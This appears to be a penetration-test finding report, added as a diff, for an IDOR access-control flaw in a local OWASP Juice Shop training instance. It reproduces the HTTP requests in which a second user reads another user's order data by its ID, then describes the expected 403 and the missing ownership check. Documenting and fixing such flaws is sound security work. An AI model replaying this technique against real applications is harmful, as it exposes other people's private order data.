@@ -1,0 +1,161 @@
+========================================================
+FINDING F-05 — IDOR / Broken Access Control
+Target: OWASP Juice Shop | Module: Order Tracking | Security Level: Default
+========================================================
+
+--- REQUEST 1 — Victim places order (session: kavach2@test.com) ---
+
+POST http://localhost:3000/api/Orders HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer <kavach2-jwt>
+Content-Type: application/json
+
+{
+  "couponData": null,
+  "orderDetails": {
+    "products": [{ "id": 24, "quantity": 1 }],
+    "addressId": 7,
+    "paymentId": 7,
+    "deliveryMethodId": 1
+  }
+}
+
+--- RESPONSE — Order created (victim's session) ---
+
+HTTP/1.1 201 Created
+Content-Type: application/json
+
+{
+  "status": "success",
+  "orderConfirmation": {
+    "orderId": "1aed-954b402dd28f9528"
+  }
+}
+
+The order ID "1aed-954b402dd28f9528" is immediately surfaced in the
+browser URL fragment:
+  http://localhost:3000/#/track-result?id=1aed-954b402dd28f9528
+
+This makes the order ID visible in browser history, shared links,
+and HTTP Referer headers — enabling trivial harvesting by an
+attacker.
+
+--- REQUEST 2 — Victim views own order (baseline / expected) ---
+
+GET http://localhost:3000/rest/track-order/1aed-954b402dd28f9528 HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer <kavach2-jwt>
+
+--- RESPONSE — Victim's own order data (expected behaviour) ---
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "status": "success",
+  "data": [
+    {
+      "promotionalAmount": "0",
+      "paymentId": "7",
+      "addressId": "7",
+      "orderId": "1aed-954b402dd28f9528",
+      "delivered": false,
+      "email": "k*v*ch2@t*st.c*m",
+      "totalPrice": 1.88,
+      "products": [
+        {
+          "quantity": 1,
+          "id": 24,
+          "name": "Apple Pomace",
+          "price": 0.89,
+          "total": 0.89,
+          "bonus": 0
+        }
+      ],
+      "bonus": 0,
+      "deliveryPrice": 0.99,
+      "eta": "1",
+      "_id": "rXrYBPvkvNDJCGfTZ"
+    }
+  ]
+}
+
+--- REQUEST 3 — ATTACKER sends same order ID (session: user2@test.com) ---
+
+GET http://localhost:3000/rest/track-order/1aed-954b402dd28f9528 HTTP/1.1
+Host: localhost:3000
+Authorization: Bearer <user2-jwt>
+
+--- RESPONSE — Victim's order data returned to ATTACKER (VULNERABLE) ---
+
+HTTP/1.1 200 OK
+Content-Type: application/json
+
+{
+  "status": "success",
+  "data": [
+    {
+      "promotionalAmount": "0",
+      "paymentId": "7",
+      "addressId": "7",
+      "orderId": "1aed-954b402dd28f9528",
+      "delivered": false,
+      "email": "k*v*ch2@t*st.c*m",
+      "totalPrice": 1.88,
+      "products": [
+        {
+          "quantity": 1,
+          "id": 24,
+          "name": "Apple Pomace",
+          "price": 0.89,
+          "total": 0.89,
+          "bonus": 0
+        }
+      ],
+      "bonus": 0,
+      "deliveryPrice": 0.99,
+      "eta": "1",
+      "_id": "rXrYBPvkvNDJCGfTZ"
+    }
+  ]
+}
+
+The server returned an IDENTICAL 200 OK response containing the
+victim's full order data to a completely different authenticated
+user. No 403 Forbidden was issued. No ownership check was
+performed. The only input required was knowledge of the order ID.
+
+--- EXPECTED SECURE RESPONSE (what should have happened) ---
+
+HTTP/1.1 403 Forbidden
+Content-Type: application/json
+
+{
+  "error": "Access denied. You are not authorized to view this order."
+}
+
+The server should compare the authenticated user's identity
+(from the JWT) against the email/userId recorded on the order and
+reject the request if they do not match.
+
+--- OBSERVATION ---
+
+The application resolves order records using only the orderId path
+parameter with no session-based ownership validation. The order ID
+is exposed in the browser URL fragment immediately after checkout,
+making it easy to harvest via browser history, shared links, or
+Referer headers. knowledge of a valid order ID is sufficient to access another user's
+order information. No ownership validation is performed between the authenticated user
+ and the requested order record.
+The fields exposed per order include: partially masked victim email,
+product names and quantities, total price, paymentId (integer),
+addressId (integer), delivery status, and an internal _id — all
+of which can serve as inputs for further attacks or privacy
+violations.
+
+========================================================
+Tool used: Firefox (manual navigation + private window);
+           Browser DevTools (REST call inspection)
+Date: 03 june 2026
+Tester: Indrajit Singh
+========================================================
